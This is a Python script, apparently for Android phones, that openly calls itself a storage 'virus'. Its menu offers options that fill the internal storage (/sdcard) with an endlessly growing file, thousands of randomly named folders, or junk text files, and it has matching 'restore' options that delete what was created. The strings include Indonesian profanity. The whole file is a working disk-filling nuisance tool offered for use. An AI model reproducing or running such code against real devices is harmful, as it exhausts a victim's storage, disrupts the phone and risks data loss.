from os import path, stat, system, remove, mkdir, removedirs, rename, listdir
from random import choice
from string import ascii_lowercase, ascii_uppercase

if path.isfile(".bakso_kontol"): pass
else:
    with open(".bakso_kontol","w", encoding="utf-8") as list_file:
        list_sdcard = listdir("/sdcard/")
        for folder_utama in list_sdcard:
            list_file.write(f"{folder_utama}\n")

def clear():
    system("clear")


def konvert_ke_bit(number):
    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if number < 1024.0: return "%3.1f %s" % (number, x)
        number /= 1024.0

def ukuran_file(lokasi_file):
    if path.isfile(lokasi_file):
        file_info = stat(lokasi_file)
        return konvert_ke_bit(file_info.st_size)

lokasi_file = r"/sdcard/bakso_kontol.txt"

def ban():
    clear()
    banner = """
            •=======================•
            | Vivirusan Penyimpanan |
            •=======================•
            |  Ctrl - C Untuk Help  |
            |~~~~~~~~~~~~~~~~~~~~~~~|
            |  Ctrl - Z Untuk Exit  |             
  •===========================================•
  |  [1] . File                               |
  |  [2] . Restore File                       |
  |  [3] . Folder                             |
  |  [4] . Restore Folder                     |
  |  [5] . File dan Folder                    |
  |  [6] . Restore File Dan Folder            |
  •===========================================•
"""
    print(banner)
    try:
        pilih = int(input("Silahkan Pilih : "))
        if (pilih == 1): virus_file()
        elif (pilih == 2): res_file()
        elif (pilih == 3): virus_folder()
        elif (pilih == 4): res_folder()
        elif (pilih == 5): file_folder()
        elif (pilih == 6): res_file_folder()
    except ValueError:
        ban()
    except KeyboardInterrupt:
        help()

def help():
    clear()
    bantuan = """
  Assalamu'alaikum bro ,

=================================================

  • File
    Ini akan membuat file dengan size yang besar,
    sehingga kalau script nya terus berjalan ,
    dia akan memenuhi penyimpanan internal.

  • Restore File
    Kamu bisa menghapus file bakso_kontol.txt 
    dengan opsi ini , atau kamu bisa langsung
    menghapusnya di penyimpanan internal.

  • Folder
    Ini Akan Membuat Folder Yang Sangat Banyak
    dengan nama random , di penyimpanan internal ,
    (tergantung lamanya script berjalan).

  • Restore Folder
    Ini akan menghapus folder yang telah di buat.

  • File dan Folder
    Ini akan membuat file dan folder dengan nama
    random , opsi ini 11 12 dengan Folder ,
    hanya saja opsi ini bukan hanya membuat folder.

  • Restore File dan Folder
    Ini akan menghapus file dan folder yang 
    telah dibuat.

=================================================
"""
    print(bantuan)
    input("Enter Untuk Kembali ")
    ban()


def virus_file():
    with open("/sdcard/bakso_kontol.txt","w",encoding="utf-8") as file:
        file.write("Virus Bakso Kontol\n\n\n")
    with open("/sdcard/bakso_kontol.txt","a",encoding="utf-8") as file:
        try:
            clear()
            print("[•] Sedang Membuat File . . .")
            print("[•] Ctrl - C Untuk Berhenti & Melihat Hasil\n")
            print("[•] Untuk Hasil Silakan Cek Di Penyimpanan Internal")
            print("[•] Nama File Nya : bakso_kontol.txt\n")
            while True:
                file.write("Bakso Kontol , ")
        except KeyboardInterrupt:
            print(f"\n\n[√] Ok Done , File Dibuat , Total Size : {ukuran_file(lokasi_file)}\n")
            input("Enter Untuk Melanjutkan ")
            ban()

def res_file():
    try:
        remove("/sdcard/bakso_kontol.txt")
        clear()
        print("[√] Ok Done , Berhasil Menghapus File\n")
        input("Enter Untuk Melanjutkan ")
        ban()
    except FileNotFoundError:
        clear()
        print("File Tidak Ada 🤨 ,")
        print("Sepertinya Sudah Dihapus \n")
        input("Enter Untuk Melanjutkan ")
        ban()

def virus_folder():
    jumlah_folder_dibuat = 0
    clear()
    print("[•] Sedang Membuat Folder . . .")
    print("[•] Ctrl - C Untuk Berhenti & Melihat Hasil\n")
    print("[•] Untuk Hasil Silakan Cek Di Penyimpanan Internal")
    print("[•] Akan Terdapat Beberapa Folder\n")
    try:
        while True:
            jumlah_folder_dibuat += 1
            nama_random = ascii_lowercase
            nama_folder = "".join(choice(nama_random) for i in range(50))
            with open("restore/folder","a",encoding="utf-8") as f_folder:
                f_folder.write(f"{nama_folder}\n")
                mkdir(f"/sdcard/{nama_folder}")
    except KeyboardInterrupt:
        print(f"\n\n[√] Ok Done , {jumlah_folder_dibuat} Folder Dibuat\n")
        input("Enter Untuk Melanjutkan")
        ban()

def res_folder():
    clear()
    while True:
        with open("restore/folder","r") as ress_folder:
            data_folder_rm = ress_folder.readlines()
            for i in data_folder_rm:
                try:
                    name_folder = i.replace("\n","")
                    removedirs(f"/sdcard/{name_folder}")
                except FileNotFoundError: continue
            try: system("rm restore/folder && touch restore/folder")
            except FileNotFoundError: pass
            print(f"[√] Ok Done , Berhasil Menghapus {len(data_folder_rm)} Folder\n")
            input("Enter Untuk Melanjutkan ")
            break
    ban()


def file_folder():
    folder_create, file_create = 0, 0
    try:
        clear()
        print("[•] Sedang Membuat File Dan Folder. . . ")
        print("[•] Ctrl - C Untuk Berhenti & Melihat Hasil\n")
        print("[•] Untuk Hasil Silakan Cek Di Penyimpanan Internal\n")
        while True:
            folder_create += 1
            file_create += 1
            nama_asci,  nama_asciii = ascii_lowercase, ascii_uppercase
            nama_folder = "".join(choice(nama_asci) for a in range(50))
            nama_file = "".join(choice(nama_asciii) for b in range(50))
            with open ("restore/folders","a",encoding="utf-8") as folders:
                folders.write(f"{nama_folder}\n")
            with open("restore/files","a",encoding="utf-8") as files:
                files.write(f"{nama_file}\n")
            mkdir(f"/sdcard/{nama_folder}")
            with open(f"/sdcard/{nama_file}.txt","w",encoding="utf-8") as file_gg:
                file_gg.write("Kontol"*100)
    except KeyboardInterrupt:
        print(f"\n\n[•] Ok Done ! ")
        print(f"[√] Folder Dibuat , Total : {folder_create}")
        print(f"[√] File Dibuat   , Total : {file_create}\n")
        input("Enter Untuk Melanjutkan ")
        ban()

def res_file_folder():
    clear()
    with open("restore/folders","r") as folders:
        list_folders = folders.readlines()
        for i in list_folders:
            folders = i.replace("\n","")
            try:
                removedirs(f"/sdcard/{folders}")
            except FileNotFoundError:
                continue
    print(f"[√] Ok Done , {len(list_folders)} Folder Di Hapus")
    with open("restore/files","r") as files:
        list_files = files.readlines()
        for i in list_files:
            files = i.replace("\n","")
            try: remove(f"/sdcard/{files}.txt")
            except FileNotFoundError: continue
    print(f"[√] Ok Done , {len(list_files)} File   Di Hapus\n")
    system("rm restore/folders && touch restore/folders")
    system("rm restore/files && touch restore/files")
    input("Enter Untuk Melanjutkan ")
    ban()

ban()
